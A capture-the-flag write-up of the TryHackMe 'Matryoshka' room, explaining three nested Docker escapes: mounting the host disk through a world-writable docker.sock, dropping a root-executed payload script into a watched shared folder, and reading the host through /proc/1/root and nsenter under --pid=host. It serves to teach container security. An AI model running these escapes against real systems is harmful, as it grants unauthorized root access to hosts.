---
description: "TryHackMe Matryoshka — a containment unit built as Russian nesting dolls. You SSH into the innermost Docker container and have to break out of it, then out of the container that runs it, then out of the one that runs THAT, and finally onto the real host — three escapes, three flags. Each escape is a different, real-world container misconfiguration: a world-writable Docker socket, a world-writable shared folder watched by a root script, and a container that shares the host's process namespace. Every command is explained flag by flag for someone who has never touched Docker, with the controls that prove each step and a teardown that removes everything dropped on the shared box."
---

# Matryoshka — breaking out of a Docker doll, three times

**TryHackMe · challenge: Matryoshka · access: SSH as `matryoshka` · target `10.x.x.x` (the lab IP changes per lease)**

> **All three flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays: every
> command with every flag explained, the exact escape technique at each layer, and the controls that
> prove each result. The flag strings themselves teach nothing — each one is a little pun on the bug
> you just exploited, and printing it here would just hand the room's answer to the next person.
>
> **What I kept and why:** the socket path, the shared-folder trick, the `--pid=host` detail, the
> `docker run` commands and the payloads are all *method*, not prize. Redacting them would gut the
> write-up. Only the flag values are removed.

**The brief:** *"You set up a containment unit designed to trap even the most nefarious viruses, but
you accidentally got trapped in it while testing it. Your memory is fuzzy."* The name is the whole
hint. A **matryoshka** is a Russian nesting doll — one doll inside another inside another. You start
inside the smallest doll and have to climb out, one shell at a time, until you reach the real
machine.

You are handed working SSH credentials up front, so this is not about breaking in. It is about
**breaking out** — the discipline of container escapes.

---

## Vocabulary first, because the room assumes none

A **container** is a lightweight, isolated box that runs one program with its own private view of
the filesystem, processes and network — but, crucially, sharing the *real* machine's Linux kernel.
It looks like a separate computer from the inside; it is not. **Docker** is the most common tool for
building and running containers.

The program that actually creates and runs containers is the **Docker daemon** (`dockerd`). You talk
to it through the **Docker socket** — a special file, usually `/var/run/docker.sock`, that is really
a phone line to the daemon. **Anyone who can write to that socket can tell the daemon to do
anything**, including "start a new container that mounts the whole host disk". That is why a Docker
socket inside a container is a classic full-machine compromise.

**Docker-in-Docker (DinD)** means running a Docker daemon *inside* a container, so that container can
itself run more containers. That is exactly how this room nests the dolls: each layer runs its own
daemon and uses it to start the next layer in.

A **mount** or **bind-mount** is making a folder (or the whole disk) from one place appear at a path
somewhere else. `docker run -v /:/host` says "take the host's root directory `/` and make it show up
as `/host` inside the new container." If you can do that, you can read and write the host's files.

A **capability** is one slice of root's power (there are ~40 of them: bind low ports, load kernel
modules, change file owners, etc.). Docker drops most of them by default, which is why a container's
`root` is weaker than the real `root`. A **privileged** container is one with *all* of them back —
effectively real root on the host.

A **namespace** is the kernel feature that gives a container its private view. There are several
kinds; the one that matters at the end is the **PID namespace** — the container's private list of
running processes, where its own main program is "process 1". If a container is started with
`--pid=host`, it *shares the host's* process list instead, and can see (and reach into) every process
on the real machine — including the host's own `init`.

---

## Recon: what am I, and where am I?

We connect with the given credentials. The account drops us into a custom wrapper shell that greets
us with `[*] You are in the Matryoshka Containment Unit. Escape is futile.` and refuses ordinary
non-interactive commands. That is a cosmetic jail, not a real one — forcing a proper terminal
(`ssh -tt`) lets every command through. (Practical note for your own runs: there was no `sshpass` on
the attack box, so the password was fed with OpenSSH's `SSH_ASKPASS` hook.)

First question always: **who am I and what is this box?**

```bash
id
# uid=1000(matryoshka) gid=1000(matryoshka) groups=1000(matryoshka)
hostname
# e128f4a1ae1b        <- a 12-hex-character name is the tell-tale of a Docker container ID
uname -a
# Linux e128f4a1ae1b 6.17.0-... -aws ... x86_64   <- an AWS-hosted Ubuntu kernel
ls -la /.dockerenv
# -rwxr-xr-x 1 root root 0 ...   <- this empty file only exists inside Docker containers
```

Three independent signals — the hex hostname, `/.dockerenv`, and the shared AWS kernel — all say the
same thing: **we are inside a Docker container.** We are an unprivileged user (`uid=1000`), not even
in the `docker` group.

Now the single most important enumeration on any container — *what is mounted in, and what can I
reach that I shouldn't?*

```bash
# What capabilities do I have? All zeros = a normal, weak container user.
grep Cap /proc/self/status
# CapEff:  0000000000000000

# Is a Docker socket exposed to me?
ls -la /var/run/docker.sock /run/docker.sock
# srw-rw-rw- 1 root 2375 0 ... /run/docker.sock
# srw-rw-rw- 1 root 2375 0 ... /var/run/docker.sock
```

There it is. `srw-rw-rw-`: the leading `s` means it is a **socket**, and `rw-rw-rw-` means
**world-writable** — anyone, including our weak `uid=1000`, can talk to the daemon. And the `docker`
command-line tool is installed:

```bash
docker version
# Client: ... 26.1.5
# Server: Docker Engine ... 25.0.5     <- the daemon answers, so the socket really works
```

The `Server:` block proving the daemon answers is our first **control**: it confirms the socket is
live before we build anything on it. We do not have to guess.

> **The lesson, stated plainly:** a Docker socket mounted into a container is not a small
> misconfiguration — it is equivalent to root on whatever machine the daemon runs on. The first flag
> is a pun on exactly this. Because the daemon runs on the *next doll out*, controlling it lets us
> step into that doll.

---

## Escape 1 — level 1 → level 2 (the runaway socket)

The move is a one-liner, and it is worth understanding byte by byte:

```bash
docker run --rm -v /:/host alpine:3.20 \
  sh -c 'cat /host/etc/hostname; cat /host/root/flag_level2.txt'
```

- `docker run` — ask the daemon to start a new container.
- `--rm` — delete it automatically when it exits, so we leave nothing behind.
- `-v /:/host` — **bind-mount `/` into the new container at `/host`.** But *whose* `/`? The daemon's.
  The daemon runs on the machine one layer out (call it *level 2*), so `/host` becomes **level 2's
  entire filesystem**, and — because a fresh container's process is `root` — we read and write it as
  root.
- `alpine:3.20` — a tiny image to run. (We checked `docker images` first; `alpine:3.20` was already
  present, so nothing needed downloading.)
- `sh -c '...'` — the command to run inside.

The output hands us level 2's hostname (`63134efe9ae3` — another container ID) and the contents of
`/root/flag_level2.txt`:

```
THM{[redacted]}
```

**Level 2 flag captured.** Its pun describes the bug we just used: a socket that lets you run away
with the next machine.

While we are here, we read the file that set this layer up, `/host/usr/local/bin/level2-entrypoint.sh`.
It is the author narrating the design — always read these:

```sh
# Start Docker daemon (DinD) with vfs storage driver ...
dockerd-entrypoint.sh --storage-driver=vfs ... &
# Level 1 -> Level 2 vuln: make the daemon socket world-writable
chmod 666 /var/run/docker.sock
# ... writes flag_level2.txt ...
# Start Level 1 with the socket handed in:
docker run -d --name level1 -v /var/run/docker.sock:/var/run/docker.sock matryoshka-level1:local
```

So the pattern is explicit: **every layer runs its own Docker daemon, deliberately makes its socket
world-writable, and starts the next-inner layer with that socket mounted in.** We just did the first
step of a recursion. We expect level 2 to have done the same to level 3.

---

## Escape 2 — level 2 → level 3 (the read-write bind)

Now the puzzle gets sharper, and this is the part worth slowing down for, because the *obvious* repeat
of escape 1 does **not** work, and the reason is the lesson.

First, is level 2 as soft as level 1? We look at level 2's real capabilities and setup (by starting
a container that shares level 2's process list and stepping into level 2's own view):

```bash
docker run --rm --privileged --pid=host -v /:/host alpine:3.20 \
  nsenter -t 1 -m -u -i -n -p sh -c 'grep CapEff /proc/self/status; find / -xdev -name docker.sock'
# CapEff:  00000000a82c35fb      <- Docker's DEFAULT dropped set, NOT full privilege
# /run/docker.sock              <- the ONLY socket, and it is level 2's OWN daemon
```

`CapEff: a82c35fb` is Docker's standard, reduced capability set — **level 2 is not privileged.** Its
storage driver is `vfs`, and its own entrypoint even leaves a comment saying vfs was chosen *on
purpose* to stop containers from inheriting the host's block devices. Translation from the author:
*the device and socket escapes are deliberately closed here.* The only socket is level 2's *own*
daemon (the one that runs level 1) — using it just loops us back to level 2, not forward to level 3.

So we stop hunting the closed doors and read the map. Level 2's mount table (`/proc/1/mountinfo`)
shows something that was mounted **in from level 3**:

```
... /mnt/level3share ... rw ...
```

```bash
ls -la /mnt/level3share
# drwxrwxrwx  inbox
# drwxrwxrwx  outbox
```

A folder called **`level3share`**, world-writable (`rwxrwxrwx`), with an `inbox` and an `outbox`.
That naming is a dead-drop: you leave something in `inbox`, and something comes back in `outbox`. The
question is *who* is watching it — and the answer (which we confirm from level 3 shortly) is a script
running as **root on level 3** that executes anything dropped into `inbox`.

We test it the honest way — drop a script that writes its findings to `outbox`, then read `outbox`:

```sh
# payload.sh  (dropped into /mnt/level3share/inbox/)
#!/bin/sh
OUT=$(find / -maxdepth 6 -type d -name outbox 2>/dev/null | head -1)
{
  id; hostname
  echo "--- flag ---"; cat /root/flag_level3.txt
} > "$OUT/result.txt" 2>&1
```

Seconds later, `inbox` is empty (the watcher consumed our script — proof it is being processed) and
`outbox/result.txt` holds our output:

```
uid=0(root) ...            <- our script ran as ROOT
6a2be3d28e6c               <- level 3's hostname (yet another container ID)
--- flag ---
THM{[redacted]}
```

**Level 3 flag captured**, and we have arbitrary root command execution on level 3. Its pun names the
bug: a *read-write bind-mounted* shared folder that should never have been writable — or watched.

> **Why this is the right channel, not just a working one.** The result comes back through a folder
> *we can read ourselves*. There is no reverse shell, no listener, no dependence on any firewall
> letting a connection out or in. When you design an exploit whose success signal arrives through
> state you already control, a silent failure can only mean one thing, and you are never left staring
> at an empty listener wondering whether the payload worked or the network ate it.

*(A side path that looked tempting and was a dead end: level 3's Docker daemon is also reachable over
the network on TCP port 2376 with TLS. But each Docker-in-Docker instance generates its own
certificate authority named `docker:dind CA`, so level 2's client certificate is signed by the wrong
CA and level 3's daemon rejects it with `remote error: tls: unknown certificate authority`. Worth
noting the distinction: a client-side "certificate is valid for X, not Y" error is your machine
checking the server; a `remote error: ...` is the server rejecting you. No client flag fixes the
second one.)*

---

## Escape 3 — level 3 → the host (spaced out of the namespace)

We now have root on level 3 (via the dead-drop). We use it to enumerate level 3 the same way we
enumerated everything else — and this time the process list gives the whole game away:

```sh
# dropped into inbox, output read from outbox
cat /proc/1/comm            # -> systemd
pgrep dockerd               # sees THREE daemons, including the host's:
#   /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock   <- host's systemd-managed daemon
grep -E 'snap|systemd' /proc/1/mountinfo
#   /snap/amazon-ssm-agent ... /snap/lxd ... /snap/core22 ...                <- the REAL host's snap mounts
```

Two things that a normal container could never see: the host's `systemd` as process 1, and the host's
snap packages in the mount table. The only way level 3 sees these is if it was started with
**`--pid=host`** — it shares the real machine's process namespace. (Level 3's own entrypoint confirms
it runs level 2 with a *reduced* capability set and no host PID sharing — the tightening we felt in
escape 2 — but level 3 itself was launched loose.)

Once you share the host's PID namespace, process 1 is the host's `init`, and Linux exposes each
process's root filesystem at `/proc/<pid>/root`. So the host's entire disk is reachable at
**`/proc/1/root`** — no exotic tooling required:

```sh
cat /proc/1/root/etc/hostname        # -> matryoshka   (the real VM's name)
ls -la /proc/1/root/root/            # the host's /root, including:
#   -r-------- 1 root root 16 ... flag_host.txt
cat /proc/1/root/root/flag_host.txt
# THM{[redacted]}
```

And to prove it beyond doubt, the same value read a second, independent way — by actually stepping
into the host's namespaces with `nsenter`:

```sh
nsenter -t 1 -m -u -i -n -p sh -c 'hostname; id; cat /root/flag_host.txt'
# matryoshka
# uid=0(root) ... groups=... (sudo)
# THM{[redacted]}
```

**Host flag captured** — root on the real `matryoshka` machine. Its pun: *spaced out*, i.e. escaped
the (name)space. Two independent reads agreeing is the control that turns "I think this is the host"
into "this is the host."

---

## The whole chain on one page

Each flag is a pun naming the bug you exploit to reach the **next** doll:

| Escape | From → To | The misconfiguration | Flag names it |
|---|---|---|---|
| 1 | level 1 → level 2 | world-writable `docker.sock` mounted into the child; `docker run -v /:/host` mounts the daemon-host's disk | runaway socket |
| 2 | level 2 → level 3 | level 2 is locked down (no privilege, vfs) — but level 3 shares a world-writable folder watched by a root script that runs whatever you drop in | read-write bind |
| 3 | level 3 → host | level 3 was started with `--pid=host`, so `/proc/1` is the host's init and `/proc/1/root` is the host disk | spaced out of the namespace |

The teaching point is that **each layer fixed the previous layer's mistake and made a new one.** Level
2 could not be escaped with a socket the way level 1 was — that hole was closed. But a different sloppy
convenience (a shared folder plus a helpful root runner) opened a new one. And the outermost wrapper,
which was careful to hand its children *reduced* privileges, was itself run with `--pid=host`. Defence
in depth means every layer, not just the ones you remembered.

---

## Cleaning up (do not skip this on a shared box)

A lab machine is shared with the next person. Everything you drop is your responsibility to remove.
Here, the only things that landed on the target were the scripts and result files in the shared
folder, and a handful of throwaway containers:

```bash
# remove every result file I wrote into level 3's outbox; the inbox was already
# emptied by the room's own runner as it consumed each script
rm -f /mnt/level3share/outbox/* /mnt/level3share/inbox/*

# verify: only the room's own 'level1' container should remain
docker ps -a
# level1  matryoshka-level1:local  Up   <- the room's, leave it. No stray containers.
```

Every probe container was started with `--rm`, so they deleted themselves. The host was only ever
**read**, never written. No reverse shells, no listeners, no SSH keys added, no `/etc/hosts` edits, no
scans. Verified, then reported — "cleaned up" is a claim that needs evidence, and the evidence here is
an empty `outbox` and a `docker ps` showing only the room's own container.

---

## What to take away

- **A Docker socket inside a container is game over for the machine that daemon runs on.** `srw-rw-rw-`
  on `docker.sock` plus a `docker` binary is all it takes; `docker run -v /:/host` reads the host disk.
- **`docker run -v /:/host` mounts the *daemon's* host, not your container's own files.** Always ask
  "whose `/` am I about to mount?"
- **When the obvious escape is deliberately closed, read the setup instead of forcing it.** The mount
  table and the entrypoint scripts name the intended path. Here, `CapEff` said "not privileged", the
  vfs comment said "devices are blocked on purpose", and the mount table said "there is a writable
  shared folder" — three readings that redirected the whole attack.
- **Prefer an exploit whose success signal you can read yourself.** The inbox/outbox dead-drop needs no
  inbound or outbound network — the answer comes back in a folder you can list.
- **`--pid=host` is a full host compromise waiting to happen.** Share the host's process list and its
  root disk is at `/proc/1/root`; no kernel exploit, no privileged container needed.
- **Defence in depth is per-layer.** Two of the three dolls were carefully hardened. The chain still
  fell because the third was not.
